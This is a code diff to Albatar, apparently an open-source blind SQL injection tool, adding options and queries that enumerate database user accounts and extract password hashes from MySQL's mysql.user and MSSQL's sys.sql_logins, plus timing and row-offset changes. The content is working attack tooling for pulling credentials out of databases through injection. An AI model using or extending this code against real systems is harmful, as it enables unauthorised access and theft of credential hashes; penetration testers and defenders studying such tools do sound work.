@@ -19,17 +19,18 @@ __version__ = 'n/a'
 __license__ = 'GPLv2'
 __banner__  = 'Albatar v%s (%s)' % (__version__, __url__)
 
-# import / logging / utils {{{
+# logging / imports / utils {{{
 import logging
 
-formatter = logging.Formatter('%(asctime)s %(name)s %(levelname)7s %(threadName)s - %(message)s', datefmt='%H:%M:%S')
+f1 = logging.Formatter('%(asctime)s %(name)s - %(message)s', datefmt='%H:%M:%S')
+f2 = logging.Formatter('%(asctime)s %(name)s %(levelname)7s %(threadName)s - %(message)s', datefmt='%H:%M:%S')
 
 sh = logging.StreamHandler()
-sh.setFormatter(formatter)
+sh.setFormatter(f1)
 sh.setLevel(logging.INFO)
 
 fh = logging.FileHandler('albatar.log')
-fh.setFormatter(formatter)
+fh.setFormatter(f2)
 fh.setLevel(logging.DEBUG)
 
 logger = logging.getLogger('albatar')
@@ -53,6 +54,14 @@ except ImportError:
 
 def T(s, **kwargs):
   return Template(s).safe_substitute(**kwargs)
+
+class Timing:
+  def __enter__(self):
+    self.t1 = time()
+    return self
+
+  def __exit__(self, exc_type, exc_value, traceback):
+    self.time = time() - self.t1
 # }}}
 
 # Requester {{{
@@ -160,7 +169,7 @@ class Method_Base:
     self.template = template
     self.num_threads = num_threads
 
-  def execute(self, query, start_offset=0, stop_offset=1):
+  def execute(self, query, start_offset, stop_offset):
     logger.info('Executing: %s' % repr(query))
 
     self.taskq = Queue()
@@ -171,24 +180,22 @@ class Method_Base:
       t.daemon = True
       t.start()
 
+    start_index, stop_index = int(start_offset), int(stop_offset)
+
     if isinstance(query, basestring):
       self.query = query
-      rows_count = 1
-    else:
-      self.query, _ = query
 
-      if stop_offset == 1:
-        rows_count = int(self.get_row())
-      else:
-        rows_count = stop_offset
+    else:
+      if stop_index == 1:
+        self.query, _ = query
+        stop_index = int(self.get_row())
 
       _, self.query = query
 
-    count = rows_count - start_offset
-    logger.debug('count: %d' % count)
+    logger.debug('retrieving %d rows, starting at row %d' % (stop_index-start_index, start_index))
       
-    for row_offset in range(count):
-      yield self.get_row(row_offset)
+    for row_index in range(start_index, stop_index):
+      yield self.get_row(row_index)
 
   def get_row(self, row_pos): pass
 
@@ -297,8 +304,8 @@ class SQLi_Base:
 
     enumeration.add_option('--users', dest='enum_users', action='store_true', help='')
     enumeration.add_option('--passwords', dest='enum_passwords', action='store_true', help='')
-    enumeration.add_option('--privileges', dest='enum_privileges', action='store_true', help='')
-    enumeration.add_option('--roles', dest='enum_roles', action='store_true', help='')
+    #enumeration.add_option('--privileges', dest='enum_privileges', action='store_true', help='')
+    #enumeration.add_option('--roles', dest='enum_roles', action='store_true', help='')
 
     enumeration.add_option('--dbs', dest='enum_dbs', action='store_true', help='')
     enumeration.add_option('--tables', dest='enum_tables', action='store_true')
@@ -308,9 +315,10 @@ class SQLi_Base:
     enumeration.add_option('-D', dest='db', default='', metavar='', help='')
     enumeration.add_option('-T', dest='table', default='', metavar='', help='')
     enumeration.add_option('-C', dest='column', default='', metavar='', help='')
+    enumeration.add_option('-U', dest='user', default='', metavar='', help='')
 
-    enumeration.add_option('--start', dest='start_offset', default=0, metavar='', help='')
-    enumeration.add_option('--stop', dest='stop_offset', default=1, metavar='', help='')
+    enumeration.add_option('--start', dest='start_offset', default='0', metavar='', help='')
+    enumeration.add_option('--stop', dest='stop_offset', default='1', metavar='', help='')
 
     parser.option_groups.extend([enumeration])
     (opts, args) = parser.parse_args(argv[1:])
@@ -329,14 +337,23 @@ class SQLi_Base:
     if opts.hostname:
       queries.append(self.hostname())
 
+    if opts.enum_users:
+      queries.append(self.enum_users())
+
+    if opts.enum_passwords:
+      for user in opts.user.split(','):
+        queries.append(self.enum_passwords(user))
+
     if opts.enum_dbs:
       queries.append(self.enum_dbs())
 
     if opts.enum_tables:
-      queries.append(self.enum_tables(opts.db))
+      for db in opts.db.split(','):
+        queries.append(self.enum_tables(opts.db))
 
     if opts.enum_columns:
-      queries.append(self.enum_columns(opts.db, opts.table))
+      for table in opts.table.split(','):
+        queries.append(self.enum_columns(opts.db, opts.table))
 
     if opts.dump_table:
       queries.append(self.dump_table(opts.db, opts.table, opts.column.split(',')))
@@ -344,9 +361,12 @@ class SQLi_Base:
     if opts.query:
       queries.append(opts.query)
 
-    for query in queries:
-      for result in self.method.execute(query, start_offset=opts.start_offset, stop_offset=opts.stop_offset):
-        yield result
+    with Timing() as timing:
+      for query in queries:
+        for result in self.method.execute(query, start_offset=opts.start_offset, stop_offset=opts.stop_offset):
+          yield result
+
+    logger.info("Time: %.2f seconds" % (timing.time))
 
 # }}}
 
@@ -364,6 +384,19 @@ class MySQL_Blind(SQLi_Base):
 
   def hostname(self):
     return 'SELECT @@HOSTNAME'
+
+  def enum_users(self):
+    c = 'SELECT COUNT(DISTINCT(user)) FROM mysql.user'
+    q = 'SELECT DISTINCT(user) FROM mysql.user LIMIT ${row_pos},1'
+    return c, q
+
+  def enum_passwords(self, user):
+    if not user:
+      raise NotImplementedError('-U required')
+
+    c = "SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user='%s'" % user
+    q = "SELECT DISTINCT(password) FROM mysql.user WHERE user='%s' LIMIT ${row_pos},1" % user
+    return c, q
 
   def enum_dbs(self):
     c = 'SELECT COUNT(schema_name) FROM information_schema.schemata'
@@ -413,9 +446,26 @@ class MSSQL_Blind(SQLi_Base):
   def hostname(self):
     return 'SELECT @@SERVERNAME'
 
+  def enum_users(self):
+    c = 'SELECT LTRIM(STR(COUNT(name))) FROM master..syslogins'
+    q = 'SELECT TOP 1 name FROM master..syslogins WHERE name' \
+        ' NOT IN (SELECT TOP ${row_pos} name FROM master..syslogins ORDER BY name) ORDER BY name'
+    return c, q
+
+  def enum_passwords(self, user):
+    if not user:
+      raise NotImplementedError('-U required')
+
+    c = T("SELECT LTRIM(STR(COUNT(password_hash))) FROM sys.sql_logins WHERE name='${user}'", user=user)
+    q = T("SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='${user}'"\
+        " AND password_hash NOT IN (SELECT TOP ${row_pos} password_hash FROM sys.sql_logins WHERE name='${user}' ORDER BY password_hash)" \
+        " ORDER BY password_hash", user=user)
+    return c, q
+
   def enum_dbs(self):
     c = 'SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases'
-    q = 'SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP ${row_pos} name FROM master..sysdatabases ORDER BY name) ORDER BY name'
+    q = 'SELECT TOP 1 name FROM master..sysdatabases WHERE name' \
+        ' NOT IN (SELECT TOP ${row_pos} name FROM master..sysdatabases ORDER BY name) ORDER BY name'
     return c, q
 
   def enum_tables(self, db):
